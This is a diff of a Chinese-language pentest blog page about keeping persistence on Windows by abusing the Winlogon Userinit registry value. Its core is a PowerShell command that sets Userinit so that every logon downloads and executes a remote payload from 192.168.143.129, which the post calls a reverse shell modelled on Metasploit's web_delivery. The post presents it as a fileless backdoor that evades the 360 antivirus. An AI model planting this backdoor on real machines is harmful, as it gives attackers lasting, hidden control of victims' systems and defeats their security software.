@@ -5,17 +5,17 @@
   
   <title>使用userinit实现持久控制 | Exist</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言 前段时间看了3gstudent师傅的文章,这篇文章中提到使用Logon Scripts实现登陆时运行脚本，并且这种方法可以绕过360，达到免杀的效果。复现的过程中我发现这种方法需要在磁盘上留下文件，隐蔽性不佳。通过查找相关资料，我找到了另一个注册表键，使用此键留下的后门同样可以bypass 360，并且可以不留下任何文件。 相关注册表键 NT\CurrentVersion\Winlogon\">
+  <meta name="description" content="前言 前段时间看了3gstudent师傅的文章,这篇文章中提到使用Logon Scripts实现登陆时运行脚本，并且这种方法可以绕过360，达到免杀的效果。复现的过程中我发现这种方法需要在磁盘上留下文件，隐蔽性不佳。通过查找相关资料，我找到了另一个注册表键，使用此键留下的后门同样可以bypass 360，并且可以不留下任何文件。 相关注册表键 1HKLM\SOFTWARE\Microsoft\Wi">
 <meta name="keywords" content="Pentest">
 <meta property="og:type" content="article">
 <meta property="og:title" content="使用userinit实现持久控制">
 <meta property="og:url" content="https://existxfx.github.io/2017/10/25/Use-userinit-to-maintain-persistence/index.html">
 <meta property="og:site_name" content="Exist">
-<meta property="og:description" content="前言 前段时间看了3gstudent师傅的文章,这篇文章中提到使用Logon Scripts实现登陆时运行脚本，并且这种方法可以绕过360，达到免杀的效果。复现的过程中我发现这种方法需要在磁盘上留下文件，隐蔽性不佳。通过查找相关资料，我找到了另一个注册表键，使用此键留下的后门同样可以bypass 360，并且可以不留下任何文件。 相关注册表键 NT\CurrentVersion\Winlogon\">
-<meta property="og:updated_time" content="2017-10-25T15:03:34.000Z">
+<meta property="og:description" content="前言 前段时间看了3gstudent师傅的文章,这篇文章中提到使用Logon Scripts实现登陆时运行脚本，并且这种方法可以绕过360，达到免杀的效果。复现的过程中我发现这种方法需要在磁盘上留下文件，隐蔽性不佳。通过查找相关资料，我找到了另一个注册表键，使用此键留下的后门同样可以bypass 360，并且可以不留下任何文件。 相关注册表键 1HKLM\SOFTWARE\Microsoft\Wi">
+<meta property="og:updated_time" content="2017-10-25T15:11:54.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="使用userinit实现持久控制">
-<meta name="twitter:description" content="前言 前段时间看了3gstudent师傅的文章,这篇文章中提到使用Logon Scripts实现登陆时运行脚本，并且这种方法可以绕过360，达到免杀的效果。复现的过程中我发现这种方法需要在磁盘上留下文件，隐蔽性不佳。通过查找相关资料，我找到了另一个注册表键，使用此键留下的后门同样可以bypass 360，并且可以不留下任何文件。 相关注册表键 NT\CurrentVersion\Winlogon\">
+<meta name="twitter:description" content="前言 前段时间看了3gstudent师傅的文章,这篇文章中提到使用Logon Scripts实现登陆时运行脚本，并且这种方法可以绕过360，达到免杀的效果。复现的过程中我发现这种方法需要在磁盘上留下文件，隐蔽性不佳。通过查找相关资料，我找到了另一个注册表键，使用此键留下的后门同样可以bypass 360，并且可以不留下任何文件。 相关注册表键 1HKLM\SOFTWARE\Microsoft\Wi">
   
   
     <link rel="icon" href="/favicon.ico">
@@ -64,7 +64,8 @@
         <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
 <p>前段时间看了3gstudent师傅的<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence/" target="_blank" rel="external">文章</a>,这篇文章中提到使用Logon Scripts实现登陆时运行脚本，并且这种方法可以绕过360，达到免杀的效果。复现的过程中我发现这种方法需要在磁盘上留下文件，隐蔽性不佳。通过查找相关资料，我找到了另一个注册表键，使用此键留下的后门同样可以bypass 360，并且可以不留下任何文件。</p>
 <h3 id="相关注册表键"><a href="#相关注册表键" class="headerlink" title="相关注册表键"></a>相关注册表键</h3><hr>
-<figure class="highlight plain"><figcaption><span>NT\CurrentVersion\Winlogon\Userinit```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">### Powershell实现</div><div class="line">```powershell</div><div class="line">Set-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name Userinit -value &quot;C:\Windows\system32\userinit.exe,powershell.exe -noexit -nop  -c $T=new-object net.webclient;$T.proxy=[Net.WebRequest]::GetSystemWebProxy();$T.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $T.downloadstring(&apos;\\192.168.143.129\bfvaNe\test.dll&apos;);&quot;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</div></pre></td></tr></table></figure>
+<h3 id="Powershell实现"><a href="#Powershell实现" class="headerlink" title="Powershell实现"></a>Powershell实现</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Set-ItemProperty</span> <span class="string">"HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon"</span> -name Userinit -value <span class="string">"C:\Windows\system32\userinit.exe,powershell.exe -noexit -nop  -c <span class="variable">$T</span>=new-object net.webclient;<span class="variable">$T</span>.proxy=[Net.WebRequest]::GetSystemWebProxy();<span class="variable">$T</span>.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX <span class="variable">$T</span>.downloadstring('\\192.168.143.129\bfvaNe\test.dll');"</span></div></pre></td></tr></table></figure>
 <p><strong>注：powershell反弹shell的payload参照msf中的web_delivery</strong></p>
 <h3 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h3><p><strong>需要管理员权限，因此如果单纯地想绕过360的话，这种方法显得比较鸡肋</strong></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>低权限下使用logon scripts, 权限较高的话也可以试试使用userinit作为一种无文件后门的方式</strong></p>
@@ -110,6 +111,8 @@
     <footer id="footer" class="post-footer footer">
       
         <ul class="footer-links">
+          
+            <li><a href="/archives"><span class="fa fa-battery-quarter"></span></a></li>
           
         </ul>
 	    
